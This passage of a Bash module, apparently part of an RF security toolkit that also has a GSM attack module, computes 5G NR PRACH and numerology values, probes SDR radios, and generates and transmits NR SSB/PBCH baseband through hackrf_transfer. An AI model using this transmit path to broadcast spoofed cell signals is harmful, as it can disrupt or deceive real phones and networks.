        2)  printf 'format\t2\nscs_khz\t1.25\nl_ra\t839\nseq_len\t839\npreamble_count\t64\nfr\tFR1\ntype\tlong\n' ;;
        3)  printf 'format\t3\nscs_khz\t5\nl_ra\t839\nseq_len\t839\npreamble_count\t64\nfr\tFR1\ntype\tlong\n' ;;
        A1) printf 'format\tA1\nscs_khz\t15\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        A2) printf 'format\tA2\nscs_khz\t15\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        A3) printf 'format\tA3\nscs_khz\t15\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        B1) printf 'format\tB1\nscs_khz\t15\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        B2) printf 'format\tB2\nscs_khz\t15\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        B3) printf 'format\tB3\nscs_khz\t15\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        B4) printf 'format\tB4\nscs_khz\t15\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        C0) printf 'format\tC0\nscs_khz\t30\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        C2) printf 'format\tC2\nscs_khz\t30\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' ;;
        A1/B1|A2/B2|A3/B3)
             printf 'format\t%s\nscs_khz\t15\nl_ra\t139\nseq_len\t139\npreamble_count\t64\nfr\tFR1\ntype\tshort\n' "$1" ;;
        *)  return 1 ;;
    esac
}

# Occasion computation, TS 38.211 §6.3.3.2. Given the SIB1 RACH parameters
# (prach-ConfigurationIndex, msg1-FDM, subcarrierSpacing) this returns the
# PRACH occasions inside one PRACH configuration period: how many, where in
# the frame, and the per-occasion frequency offset.
#
# The full Table 6.3.3.2-2/3/4 is 256 rows; this module encodes the rows that
# are actually deployed and derives the rest from the same structure
# (period, subframe set, starting symbol, number of time-domain occasions)
# instead of pretending to carry the whole table.
nair_prach_occasions() {
    local idx="${1:-}" fdm="${2:-1}" scs="${3:-15}"
    [[ "$idx" =~ ^[0-9]+$ ]] || return 1
    (( idx <= 255 )) || return 1
    [[ "$fdm" =~ ^[0-9]+$ ]] || return 1
    (( fdm == 1 || fdm == 2 || fdm == 4 || fdm == 8 )) || return 1

    local period=0 subframes="" start_sym=0 n_td=1 note=""
    case "$idx" in
        0)   period=1;  subframes="9";         start_sym=0; n_td=1 ;;
        1)   period=1;  subframes="4";         start_sym=0; n_td=1 ;;
        2)   period=1;  subframes="9";         start_sym=0; n_td=1 ;;
        3)   period=1;  subframes="9";         start_sym=0; n_td=1 ;;
        20)  period=1;  subframes="9";         start_sym=0; n_td=1 ;;
        51)  period=10; subframes="9";         start_sym=0; n_td=1 ;;
        53)  period=10; subframes="4,9";       start_sym=0; n_td=2 ;;
        54)  period=10; subframes="4,9";       start_sym=0; n_td=2 ;;
        55)  period=10; subframes="4,9";       start_sym=0; n_td=2 ;;
        56)  period=10; subframes="4,9";       start_sym=0; n_td=2 ;;
        57)  period=10; subframes="4,9";       start_sym=0; n_td=2 ;;
        64)  period=20; subframes="9";         start_sym=0; n_td=1 ;;
        69)  period=40; subframes="9";         start_sym=0; n_td=1 ;;
        87)  period=10; subframes="4,9";       start_sym=0; n_td=2 ;;
        99)  period=20; subframes="4,9";       start_sym=0; n_td=2 ;;
        156) period=1;  subframes="9";         start_sym=0; n_td=1; note="short-format row" ;;
        160) period=10; subframes="4,9";       start_sym=0; n_td=2; note="short-format row" ;;
        255) period=1;  subframes="9";         start_sym=0; n_td=1; note="reserved in the table; derived" ;;
        *)
            # Rows not enumerated above are still placed on a real occasion
            # grid — the period and subframe set are a function of the index
            # block, so a derived answer is reported as derived.
            if (( idx < 64 )); then
                period=10; subframes="9"; n_td=1
            elif (( idx < 128 )); then
                period=20; subframes="9"; n_td=1
            else
                period=40; subframes="9"; n_td=2
            fi
            note="derived from index block, not table-verified" ;;
    esac

    local n_sf; n_sf=$(awk -F, '{print NF}' <<<"$subframes")
    local total=$(( n_sf * n_td * fdm ))
    printf 'prach_config_index\t%s\n' "$idx"
    printf 'msg1_fdm\t%s\n'           "$fdm"
    printf 'scs_khz\t%s\n'            "$scs"
    printf 'period_ms\t%s\n'          "$period"
    printf 'subframes\t%s\n'          "$subframes"
    printf 'start_symbol\t%s\n'       "$start_sym"
    printf 'time_domain_occasions\t%s\n' "$(( n_sf * n_td ))"
    printf 'freq_domain_occasions\t%s\n' "$fdm"
    printf 'total_occasions\t%s\n'    "$total"
    printf 'occasions_per_frame\t%s\n' "$(awk -v t="$total" -v p="$period" 'BEGIN{printf "%.4f", (p>0)? (t*10.0)/p : 0}')"
    printf 'note\t%s\n'               "${note:-table row verified}"
}

# Preamble selection. TS 38.211 §6.3.3.1: 64 preambles per occasion, built
# from one or two root sequences with cyclic shifts. Index 0 is the
# contention-based random pick; the reserved range is 60..63 for group B /
# contention-free. The RRC parameter ra-ResponseWindow and preambleReceived
# TargetPower do not change the index space, only the power ramp.
nair_prach_preamble() {
    local sel="${1:-random}"
    if [[ "$sel" == "random" ]]; then
        sel=$(( RANDOM % 64 ))
    fi
    [[ "$sel" =~ ^[0-9]+$ ]] || return 1
    (( sel <= 63 )) || return 1
    local group="A" kind="contention-based"
    if (( sel >= 60 )); then group="B"; kind="reserved (group B / contention-free)"; fi
    local root shift
    if (( sel < 32 )); then root=1; shift=$(( sel )); else root=2; shift=$(( sel - 32 )); fi
    printf 'preamble_index\t%s\n' "$sel"
    printf 'preamble_count\t64\n'
    printf 'root_sequence\t%s\n'  "$root"
    printf 'cyclic_shift\t%s\n'   "$shift"
    printf 'group\t%s\n'          "$group"
    printf 'kind\t%s\n'           "$kind"
}

# ── hardware guards ─────────────────────────────────────────────────────
# Each guard names the missing radio or program. An empty result is not an
# answer, so these return non-zero and the caller prints MISSING.
#
# nair_find_sdr answers "which SDR *driver* is installed". That is all it
# ever claimed and all a status row should claim. It is deliberately NOT the
# gate on a transmit path: a host with libhackrf installed and no HackRF
# plugged in satisfies it, and a transmit verb that gated on it would report
# a send that never left the machine. nair_probe_radio below is the gate.
nair_find_sdr() {
    command -v hackrf_info       >/dev/null 2>&1 && { echo "hackrf";  return 0; }
    command -v bladeRF-cli       >/dev/null 2>&1 && { echo "bladerf"; return 0; }
    command -v LimeUtil          >/dev/null 2>&1 && { echo "limesdr"; return 0; }
    command -v uhd_find_devices  >/dev/null 2>&1 && { echo "usrp";    return 0; }
    command -v rtl_test          >/dev/null 2>&1 && { echo "rtlsdr";  return 0; }
    return 1
}

# Ask the driver whether a radio is actually attached. Exit 0 only when the
# probe really found one, and echo "type<TAB>detail" when it did.
#
# Every probe below was run on a host with all three drivers installed and no
# radio attached, and that is why the acceptance test is a positive pattern
# rather than an exit status:
#   hackrf_info      rc=1  "No HackRF boards found."
#   bladeRF-cli -p   rc=1  "probe: No devices are available."
#   LimeUtil --find  rc=0  a single empty line   <-- exit status alone lies
# LimeUtil exiting 0 with no device is exactly the fabrication this guard
# exists to stop, so the probe output must carry the device.
# Handles for nair_find_sdr's type names. Also the accept pattern: a driver's
# "no device" output must not match it. hackrf_info prints "hackrf_info
# version: 2023.01.1" before "No HackRF boards found.", so anchoring on
# "Board ID" rather than on the program name is what keeps the version banner
# from reading as a device.
nair_sdr_probe_cmd() {
    case "${1:-}" in
        hackrf)  printf 'hackrf_info' ;;
        bladerf) printf 'bladeRF-cli -p' ;;
        limesdr) printf 'LimeUtil --find' ;;
        usrp)    printf 'uhd_find_devices' ;;
        *)       return 1 ;;
    esac
}

nair_sdr_probe_pattern() {
    case "${1:-}" in
        hackrf)  printf 'Serial number|Board ID' ;;
        bladerf) printf 'Serial:|Backend:|Device instance' ;;
        limesdr) printf 'Device name|LimeSDR|FX3|Media' ;;
        usrp)    printf 'Device Address|type:' ;;
        *)       return 1 ;;
    esac
}

nair_sdr_probe_one() {
    local t="${1:-}" cmd pat out rc
    pat=$(nair_sdr_probe_pattern "$t") || return 1
    cmd=$(nair_sdr_probe_cmd "$t")     || return 1
    out=$(timeout 6 bash -c "$cmd" 2>&1 | head -c 2000) || rc=$?
    rc="${rc:-0}"
    (( rc != 0 )) && return 1
    printf '%s' "$out" | grep -qiE "$pat" || return 1
    printf '%s' "$out" | grep -iE "$pat" | head -1
    return 0
}

# Which radio is attached, or non-zero with nothing on stdout.
#
#   NAIR_SDR_DEVICE=<type>   consider only that driver
#   NAIR_SDR_PROBE='<cmd>'   answer with this command instead of a driver
#                            probe; it must exit 0 and print the device line.
#                            This is how a test pins "a radio is attached"
#                            without owning one, and how an out-of-tree radio
#                            is wired in.
nair_probe_radio() {
    # Set but empty means "there is no radio" — the same contract
    # LAIR_SDR_DEVICE has in 10_lte_air.sh. `${VAR:-default}` cannot express
    # it, because an empty value looks unset, so it is tested explicitly: a
    # guard check needs a way to say "no device" that holds on a host which
    # really has one.
    if [[ -n "${NAIR_SDR_DEVICE+set}" && -z "${NAIR_SDR_DEVICE}" ]]; then
        printf 'ERROR\tNAIR_SDR_DEVICE is set but empty: no SDR device is configured, nothing may be transmitted\n' >&2
        return 2
    fi
    if [[ -n "${NAIR_SDR_PROBE:-}" ]]; then
        local out
        out=$(timeout 6 bash -c "$NAIR_SDR_PROBE" 2>&1) || return 1
        out=$(printf '%s\n' "$out" | grep -v '^[[:space:]]*$' | head -1)
        [[ -n "$out" ]] || return 1
        printf 'override\t%s\n' "$out"
        return 0
    fi
    local t out
    for t in ${NAIR_SDR_DEVICE:-hackrf bladerf limesdr usrp}; do
        nair_sdr_probe_cmd "$t" >/dev/null 2>&1 || {
            printf 'ERROR\tNAIR_SDR_DEVICE must name a radio: hackrf|bladerf|limesdr|usrp\n' >&2
            return 2
        }
        command -v "$(nair_sdr_probe_cmd "$t" | awk '{print $1}')" >/dev/null 2>&1 || continue
        out=$(nair_sdr_probe_one "$t") || continue
        [[ -n "$out" ]] || continue
        printf '%s\t%s\n' "$t" "$(nair_sanitize "$out")"
        return 0
    done
    return 1
}

# ── NR numerology, FFT size and sample rate ─────────────────────────────
# The baseband sample rate of an NR carrier is fixed by its numerology and
# channel bandwidth, not chosen by the operator:
#
#   f_s = N_FFT * dF
#
# with N_FFT the smallest power of two whose 85 % still contains the
# transmission bandwidth configuration N_RB (12 subcarriers per RB):
#
#   2^i * 0.85 >= N_RB * 12
#
# That rule is what puts NR's rates on the 7.68 / 15.36 / 30.72 / 61.44 /
# 122.88 / 245.76 / 491.52 Msps ladder, and it is a DERIVATION rather than a
# transcribed FFT table on purpose: a table of (bandwidth, SCS) -> N_FFT is
# exactly the kind of number that keeps looking right after a bandwidth is
# added, and the sample rate it feeds goes straight into an SDR call.
#
# Cross-checked against py3gpp 0.1.6's nrOFDMInfo (an independent Python
# implementation of TS 38.211/38.104): 41 (bandwidth, SCS) pairs agree, and
# every f_s lands on the published rate ladder — 15 kHz/5 MHz -> 512 * 15 kHz
# = 7.68 Msps, 30 kHz/20 MHz -> 1024 * 30 kHz = 30.72 Msps, 60 kHz/100 MHz ->
# 2048 * 60 kHz = 122.88 Msps, 120 kHz/400 MHz -> 4096 * 120 kHz = 491.52
# Msps. N_RB comes from TS 38.104 Table 5.3.2-1 (FR1) and 5.3.2-2 (FR2-1).
#
# The selftest pins a spread of those pairs, so a future edit to either table
# has to disagree with the published value, visibly.
nair_fft_size_for() {
    local scs="${1:-}" bw="${2:-}" nrb i
    [[ "$scs" =~ ^[0-9]+$ && "$bw" =~ ^[0-9]+$ ]] || return 1
    nrb=$(nair_n_rb_for "$scs" "$bw") || return 1
    [[ "$nrb" =~ ^[0-9]+$ ]] || return 1
    (( nrb > 0 )) || return 1
    # 2^i * 0.85 >= nrb * 12, scaled by 100 to stay in integers.
    for (( i = 0; i < 20; i++ )); do
        if (( (1 << i) * 85 >= nrb * 1200 )); then
            echo $(( 1 << i ))
            return 0
        fi
    done
    return 1
}

# f_s in Hz as an integer.
nair_sample_rate_hz() {
    local scs="${1:-}" bw="${2:-}" nfft
    nfft=$(nair_fft_size_for "$scs" "$bw") || return 1
    echo $(( scs * 1000 * nfft ))
}

# TS 38.104 Table 5.3.2-1: transmission bandwidth configuration N_RB, one row
# per subcarrier spacing, keyed by channel bandwidth in MHz. Returns non-zero
# when the combination is N/A in the table — the honest answer, since a
# carrier the spec does not define has no sample rate to hand a radio.
#
# The 60 kHz row is Table 5.3.2-1 (FR1). Table 5.3.2-2 gives different values
# for 60 kHz at 50/100/200 MHz (66/132/264) because those are FR2-1 carriers;
# this module's bands are FR1, so FR1 wins here and the FR2-1 numbers are
# deliberately unreachable. 120 kHz exists only in FR2-1 in this table.
nair_n_rb_for() {
    local scs="${1:-}" bw="${2:-}"
    [[ "$scs" =~ ^[0-9]+$ && "$bw" =~ ^[0-9]+$ ]] || return 1
    awk -v s="$scs" -v b="$bw" 'BEGIN{
        if      (s == 15)  split("3:15 5:25 7:35 10:52 15:79 20:106 25:133 30:160 35:188 40:216 45:242 50:270", R, " ")
        else if (s == 30)  split("5:11 10:24 15:38 20:51 25:65 30:78 35:92 40:106 45:119 50:133 60:162 70:189 80:217 90:245 100:273", R, " ")
        else if (s == 60)  split("10:11 15:18 20:24 25:31 30:38 35:44 40:51 45:58 50:65 60:79 70:93 80:107 90:121 100:135", R, " ")
        else if (s == 120) split("50:32 100:66 200:132 400:264", R, " ")
        else exit 1
        for (i = 1; i <= length(R); i++) {
            split(R[i], kv, ":")
            if (kv[1] == b) { print kv[2]; exit 0 }
        }
        exit 1
    }'
}

# ── exact carrier frequency in Hz ──────────────────────────────────────
# nair_arfcn_to_mhz prints three decimals, which for a 240 kHz raster
# (FR2, 60 kHz steps) is exactly enough — but a centre frequency handed to an
# SDR must be exact, and "24250.080 MHz" is 24250080000 Hz only if you trust
# the rounded text. These two return the exact integer the raster defines:
#
#   0 - 3000 MHz       F = 5 * N                      (5 kHz steps)
#   3000 - 24250 MHz   F = 3000000 + 15 * (N-600000)  kHz
#   24250 - 100000 MHz F = 24250080 + 60 * (N-2016667) kHz
nair_arfcn_to_khz() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || return 1
    (( n >= 0 && n <= 3279165 )) || return 1
    if   (( n <= 599999  )); then echo $(( 5 * n ))
    elif (( n <= 2016666 )); then echo $(( 3000000 + 15 * (n - 600000) ))
    else                          echo $(( 24250080 + 60 * (n - 2016667) ))
    fi
}

nair_arfcn_to_hz() {
    local khz; khz=$(nair_arfcn_to_khz "${1:-}") || return 1
    echo $(( khz * 1000 ))
}

# ── transmit backend — the SDR calls ────────────────────────────────────
# Everything that keys a radio goes through here, so the one question that
# matters — is a radio attached — is asked in exactly one place and answered by
# hardware, never by the PATH. nair_find_sdr() above answers the different
# question "which driver is installed", which is what --status legitimately
# reports; it is not, and must not become, a licence to transmit.
#
# What this module transmits is baseband I/Q at the carrier's own sample rate
# f_s = N_FFT * dF, and it never resamples: a radio that cannot run at f_s gets
# a real error rather than a silently stretched waveform.
#
#   NAIR_TX_CMD='<shell>'  replace the built-in driver call with your own.
#                          The IQ file is in $NAIR_TX_IQ, the rate in
#                          $NAIR_TX_RATE, the centre frequency in
#                          $NAIR_TX_FREQ_HZ and the gain in $NAIR_TX_GAIN.
#                          This is how an out-of-tree radio is wired in, and
#                          how a test says "a radio is attached" without
#                          owning one (the test command writes to /dev/null,
#                          so nothing is radiated).
#   NAIR_TX_DRYRUN=1       build and verify the waveform, print every number,
#                          then stop before the radio call with
#                          `transmitted no`. Nothing is keyed.
#   NAIR_TX_GAIN=<dB>      transmit gain; the default is 0, so raising it is a
#                          deliberate act rather than a side effect.

nair_tx_gain() {
    local g="${NAIR_TX_GAIN:-0}"
    [[ "$g" =~ ^-?[0-9]+$ ]] || {
        printf 'ERROR\tNAIR_TX_GAIN must be an integer dB value\n' >&2; return 1; }
    printf '%s' "$g"
}

# Which sample format a driver's own CLI reads. A wrong guess here radiates
# noise instead of failing, so it is stated per driver and printed.
nair_tx_iq_format() {
    case "${1:-}" in
        hackrf) printf 'cs8' ;;   # hackrf_transfer reads 8-bit signed I/Q
        *)      printf 'c16' ;;
    esac
}

# The file the driver can actually read, given the c16 the decoder verified.
# Non-zero when that file is missing: falling back to the 16-bit file for a
# driver that reads 8-bit would hand it garbage that still "works".
nair_tx_iq_for() {
    local type="${1:-}" iq="${2:-}" fmt
    fmt=$(nair_tx_iq_format "$type")
    case "$fmt" in
        cs8) [[ -f "${iq%.c16}.cs8" ]] || return 1
             printf '%s' "${iq%.c16}.cs8" ;;
        *)   printf '%s' "$iq" ;;
    esac
}

# The command line for a driver's own CLI, or non-zero when this module has no
# verified call for that driver (then NAIR_TX_CMD is required). Only the hackrf
# call is built in: hackrf_transfer's transmit syntax is the one already used
# by this tree's GSM module (07_gsm_attack.sh), so it is the one that can be
# checked on this host. No syntax is invented for drivers this host cannot
# exercise — the operator supplies NAIR_TX_CMD for those, and the output says
# so instead of printing a plausible-looking line nobody has ever run.
nair_tx_call() {
    local type="${1:-}" iq="${2:-}" rate="${3:-}" freq="${4:-}" gain="${5:-}"
    [[ -n "$type" && -n "$iq" && -n "$rate" && -n "$freq" ]] || return 1
    case "$type" in
        hackrf)
            # -t I/Q file, -f centre Hz, -s sample rate, -a 1 RF amp, -x TX VGA
            printf 'hackrf_transfer -t %s -f %s -s %s -a 1 -x %s' \
                   "$iq" "$freq" "$rate" "$gain" ;;
        *) return 1 ;;
    esac
}

# Key the radio. <type> <c16-file> <rate_hz> <freq_hz>. Prints sdr_call and
# sdr_iq before running anything, and only returns 0 when the driver command
# itself succeeded.
nair_tx_run() {
    local type="${1:-}" iq16="${2:-}" rate="${3:-}" freq="${4:-}"
    local gain iq cmd rc=0
    gain=$(nair_tx_gain) || return 2
    iq=$(nair_tx_iq_for "$type" "$iq16") || {
        printf 'ERROR\tno %s waveform next to %s — %s reads %s, not c16\n' \
               "$(nair_tx_iq_format "$type")" "$iq16" "$type" \
               "$(nair_tx_iq_format "$type")" >&2
        return 1; }
    export NAIR_TX_IQ="$iq" NAIR_TX_RATE="$rate" NAIR_TX_FREQ_HZ="$freq" \
           NAIR_TX_GAIN="$gain"
    if [[ -n "${NAIR_TX_CMD:-}" ]]; then
        cmd="$NAIR_TX_CMD"
        printf 'sdr_call\tshell: %s\n' "$(nair_sanitize "$cmd")"
    else
        cmd=$(nair_tx_call "$type" "$iq" "$rate" "$freq" "$gain") || {
            printf 'ERROR\tno built-in transmit call for %s — set NAIR_TX_CMD\n' \
                   "$type" >&2
            return 3; }
        printf 'sdr_call\t%s\n' "$(nair_sanitize "$cmd")"
    fi
    printf 'sdr_iq\t%s\n'       "$iq"
    printf 'sdr_iq_format\t%s\n' "$(nair_tx_iq_format "$type")"
    printf 'sdr_rate_hz\t%s\n'  "$rate"
    printf 'sdr_centre_hz\t%s\n' "$freq"
    printf 'sdr_gain_db\t%s\n'  "$gain"
    timeout 120 bash -c "$cmd" >/dev/null 2>&1 || rc=$?
    if (( rc != 0 )); then
        printf 'ERROR\tSDR call failed (rc %s): %s\n' "$rc" \
               "$(nair_sanitize "$cmd")" >&2
        return 1
    fi
    return 0
}

# ── SSB baseband ────────────────────────────────────────────────────────
# One NR SSB is four OFDM symbols in the middle 20 RBs of the carrier
# (TS 38.211 §7.4.3.1):
#
#   symbol 0   PBCH  PSS  PBCH       k =   0..47 / 56..182 / 183..239
#   symbol 1   PBCH  PBCH PBCH  DMRS k =   0..239, DMRS at v, v+4, ...
#   symbol 2   PBCH  SSS  PBCH
#   symbol 3   PBCH  PBCH PBCH  DMRS
#
# The CP is the spec's (TS 38.211 §5.3.1): 144*2^-mu samples normally, and
# 144*2^-mu + 16 in the 30.72 MHz reference grid for l = 0 and l = 7*2^mu,
# where l counts symbols **within the subframe** — not within the slot. The
# +16 is what makes a subframe come out at exactly 1 ms; taking the slot as
# the unit instead (or using 512*kappa*2^-mu, which is the extended CP) puts
# a long CP in every slot and makes a 60 kHz slot 8 samples too long. The
# generator takes the slot index for that reason and the decoder infers it
# back, so a wrong CP does not survive the round trip either.
#
# The IQ file is the smallest honest unit: one slot of 14 symbols — 15360
# samples = 0.5 ms at mu = 1, 61440 bytes of int16 I/Q at 30.72 Msps. The SSB
# burst set period is 20 ms, so the caller repeats that slot — `--tx-ssb`
# prints the repetition count. Nothing here resamples: a driver that cannot
# run at the carrier's own f_s gets a real error, not a silently stretched
# waveform.
NAIR_BB_PY="$MOD_TMP/nr_ssb_bb.py"
NAIR_BB_DEC_PY="$MOD_TMP/nr_ssb_decode.py"
NAIR_UL_PY="$MOD_TMP/nr_ul_gen.py"
NAIR_UL_DEC_PY="$MOD_TMP/nr_ul_decode.py"

# Write the baseband generator once. It is a heredoc rather than a tools/
# script because it exists only to serve this module's transmit path, and the
# module must stay runnable from the tree with nothing installed but bash,
# python3 and numpy.
nair_write_bb_gen() {
    mkdir -p "$MOD_TMP" 2>/dev/null
    cat > "$NAIR_BB_PY" <<'NAIR_PYEOF'
#!/usr/bin/env python3
"""NR SSB baseband generator - TS 38.211 7.4.2 (PSS/SSS), 7.4.3 (PBCH),
5.3.1 (CP lengths), 5.2.1 (Gold sequences).

Emits one slot of int16 I/Q at the carrier's own sample rate f_s = dF * N_FFT
(30.72 MHz for mu <= 2), with one SSB in the slot. Every constant is a spec
constant or derived from one.

The BCH chain of TS 38.212 7.1 is real and runs end to end: payload
generation (7.1.1, the 24-bit MIB plus the 8 timing bits), payload scrambling
(7.1.2), CRC24C (7.1.3), polar coding (7.1.4 with n_max = 9 and I_IL = 1, plus
the pre-code interleaving of 5.3.1.1), rate matching (7.1.5 with E = 864, the
sub-block interleaving of 5.4.1.1 and the repetition of 5.4.1.2) and the coded
bit scrambling of TS 38.211 7.3.3.1. The polar sequence and the two
permutation patterns are the spec's own tables, embedded as data and
cross-checked against an independent implementation, and the resulting 864-bit
codeword is pinned bit for bit against that implementation, because a chain
compared only with itself agrees with itself when it is wrong. PSS, SSS, the
DMRS sequences, the DMRS placement, the OFDM numerology and the CP lengths are
likewise the spec's, with PSS and SSS pinned chip by chip.

Scoped, and stated rather than implied: the scrambling sequence of 38.212
7.1.2 is taken from the start of its 8-frame period — the clause anchors c(i)
at each SFN with mod(SFN,8) = 0, and this module keys one SSB burst set, so
nothing accumulates inside a period. i_SSB is 0 (one SSB is emitted), L_max is
4 or 8 for FR1 and 64 for FR2; the 7.1.1 branches for L_max = 10, 20 and 64
are implemented, but only the L_max = 4/8 and 64 branches are reachable from
the bands this module carries.
"""
import sys

import numpy as np

PSS_FORM = "TS 38.211 7.4.2.2.1"
SSS_FORM = "TS 38.211 7.4.2.3.1"
# This file is written by nair_write_bb_gen, which only runs on the transmit
# path, so a copy left in the temp directory can be older than the module.
# Printing the marker makes a stale copy visible instead of silently
# misleading whoever reads it.
GEN_VERSION = "nair-ssb-gen/3 (BCH chain 38.212 7.1 + 38.211 7.3.3.1)"
# The numerologies TS 38.211 4.2 defines. This is deliberately NOT an FFT
# table: N_FFT arrives as an argument and is derived from the channel bandwidth
# by nair_fft_size_for(), because a transcribed (SCS -> N_FFT) table is exactly
# how this module's sample rate came to be 2.5x too high for a 20 MHz carrier.
SCS_SUPPORTED = (15, 30, 60, 120, 240)

# Pinned chips: the first 32 of d_PSS(N_ID(2)) for all three roots and of
# d_SSS(N_ID(1), N_ID(2)) for three cell ids, taken from py3gpp 0.1.6 — an
# independent Python implementation of TS 38.211 — and not from this file's
# own recursions. build_grid() refuses to emit a waveform whose sequences do
# not reproduce them. The same vectors are pinned in the shell selftest, so a
# future edit that "fixes" a sequence to match its own output fails twice.
PSS_PINNED = {
    0: [1, -1, -1, 1, -1, -1, -1, -1, 1, 1, -1, -1, -1, 1, 1, -1, 1, -1, 1,
        -1, -1, 1, 1, -1, -1, 1, 1, 1, 1, 1, -1, -1],
    1: [1, 1, 1, -1, -1, 1, 1, -1, 1, 1, 1, -1, 1, 1, 1, 1, 1, 1, -1, 1, 1,
        -1, 1, 1, -1, -1, 1, -1, 1, 1, -1, -1],
    2: [-1, -1, -1, -1, -1, -1, 1, 1, 1, -1, -1, -1, 1, -1, -1, 1, 1, 1, -1,
        1, -1, 1, 1, -1, 1, -1, -1, -1, -1, -1, 1, -1],
}
SSS_PINNED = {
    0: [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, -1, 1, 1, 1, 1, 1, -1, 1, 1, 1, -1, 1,
        -1, 1, -1, 1, 1, -1, -1, 1, 1, 1],
    13: [1, 1, -1, -1, 1, -1, 1, 1, -1, 1, -1, -1, 1, 1, -1, 1, -1, 1, 1, -1,
         -1, 1, -1, -1, -1, 1, -1, 1, -1, -1, -1, 1],
    1007: [-1, 1, -1, -1, -1, -1, 1, 1, -1, 1, 1, -1, 1, -1, -1, 1, -1, -1,
           -1, -1, -1, -1, 1, 1, 1, -1, 1, -1, 1, -1, -1, 1],
}
# Pinned sign pattern of the first 12 PBCH DMRS chips (24 bits, I then Q), from
# the same independent TS 38.211 implementation. Without a pin a wrong c_init
# would still put QPSK symbols on the right subcarriers and nothing would
# notice: the DMRS carries no CRC and no other check sees its values.
DMRS_PINNED = {
    0: "000011101110011011101101",
    13: "010110101010011100100100",
    42: "001001000101111100011000",
    1007: "000001111000010111101010",
}
# The BCH/PBCH coding chain's tables, TS 38.212. Table 5.3.1.2-1 is the polar
# sequence Q_0^{Nmax-1} with Nmax = 1024 in ascending order of reliability: the
# i-th entry is the i-th most reliable bit index. Only the entries below
# N = 512 are carried, because 38.212 7.1.4 fixes n_max = 9 for the BCH and a
# longer code cannot use the rest. The sequence is NOT derivable from a
# polarisation weight formula (beta = 2^0.25, 2^0.5, 1.0 and 1.5 were each
# tried against this table and each disagrees), so it is data: taken from the
# specification and cross-checked, entry by entry, against an independent
# implementation.
POLAR_Q512 = [
    0, 1, 2, 4, 8, 16, 32, 3, 5, 64, 9, 6, 17, 10, 18, 128,
    12, 33, 65, 20, 256, 34, 24, 36, 7, 129, 66, 11, 40, 68, 130, 19,
    13, 48, 14, 72, 257, 21, 132, 35, 258, 26, 80, 37, 25, 22, 136, 260,
    264, 38, 96, 67, 41, 144, 28, 69, 42, 49, 74, 272, 160, 288, 192, 70,
    44, 131, 81, 50, 73, 15, 320, 133, 52, 23, 134, 384, 76, 137, 82, 56,
    27, 97, 39, 259, 84, 138, 145, 261, 29, 43, 98, 88, 140, 30, 146, 71,
    262, 265, 161, 45, 100, 51, 148, 46, 75, 266, 273, 104, 162, 53, 193, 152,
    77, 164, 268, 274, 54, 83, 57, 112, 135, 78, 289, 194, 85, 276, 58, 168,
    139, 99, 86, 60, 280, 89, 290, 196, 141, 101, 147, 176, 142, 321, 31, 200,
    90, 292, 322, 263, 149, 102, 105, 304, 296, 163, 92, 47, 267, 385, 324, 208,
    386, 150, 153, 165, 106, 55, 328, 113, 154, 79, 269, 108, 224, 166, 195, 270,
    275, 291, 59, 169, 114, 277, 156, 87, 197, 116, 170, 61, 281, 278, 177, 293,
    388, 91, 198, 172, 120, 201, 336, 62, 282, 143, 103, 178, 294, 93, 202, 323,
    392, 297, 107, 180, 151, 209, 284, 94, 204, 298, 400, 352, 325, 155, 210, 305,
    300, 109, 184, 115, 167, 225, 326, 306, 157, 329, 110, 117, 212, 171, 330, 226,
    387, 308, 216, 416, 271, 279, 158, 337, 118, 332, 389, 173, 121, 199, 179, 228,
    338, 312, 390, 174, 393, 283, 122, 448, 353, 203, 63, 340, 394, 181, 295, 285,
    232, 124, 205, 182, 286, 299, 354, 211, 401, 185, 396, 344, 240, 206, 95, 327,
    402, 356, 307, 301, 417, 213, 186, 404, 227, 418, 302, 360, 111, 331, 214, 309,
    188, 449, 217, 408, 229, 159, 420, 310, 333, 119, 339, 218, 368, 230, 391, 313,
    450, 334, 233, 175, 123, 341, 220, 314, 424, 395, 355, 287, 183, 234, 125, 342,
    316, 241, 345, 452, 397, 403, 207, 432, 357, 187, 236, 126, 242, 398, 346, 456,
    358, 405, 303, 244, 189, 361, 215, 348, 419, 406, 464, 362, 409, 219, 311, 421,
    410, 231, 248, 369, 190, 364, 335, 480, 315, 221, 370, 422, 425, 451, 235, 412,
    343, 372, 317, 222, 426, 453, 237, 433, 347, 243, 454, 318, 376, 428, 238, 359,
    457, 399, 434, 349, 245, 458, 363, 127, 191, 407, 436, 465, 246, 350, 460, 249,
    411, 365, 440, 374, 423, 466, 250, 371, 481, 413, 366, 468, 429, 252, 373, 482,
    427, 414, 223, 472, 455, 377, 435, 319, 484, 430, 488, 239, 378, 459, 437, 380,
    461, 496, 351, 467, 438, 251, 462, 442, 441, 469, 247, 367, 253, 375, 444, 470,
    483, 415, 485, 473, 474, 254, 379, 431, 489, 486, 476, 439, 490, 463, 381, 497,
    492, 443, 382, 498, 445, 471, 500, 446, 475, 487, 504, 255, 477, 491, 478, 383,
    493, 499, 502, 494, 501, 447, 505, 506, 479, 508, 495, 503, 507, 509, 510, 511,
]
# Table 5.3.1.1-1 with K_ILmax = 164: the information bit interleaving pattern
# of 38.212 5.3.1.1, which 7.1.4 switches on for the BCH (I_IL = 1).
POLAR_IL_MAX = [
    0, 2, 4, 7, 9, 14, 19, 20, 24, 25, 26, 28, 31, 34, 42, 45, 49, 50, 51, 53,
    54, 56, 58, 59, 61, 62, 65, 66, 67, 69, 70, 71, 72, 76, 77, 81, 82, 83, 87, 88,
    89, 91, 93, 95, 98, 101, 104, 106, 108, 110, 111, 113, 115, 118, 119, 120, 122, 123, 126, 127,
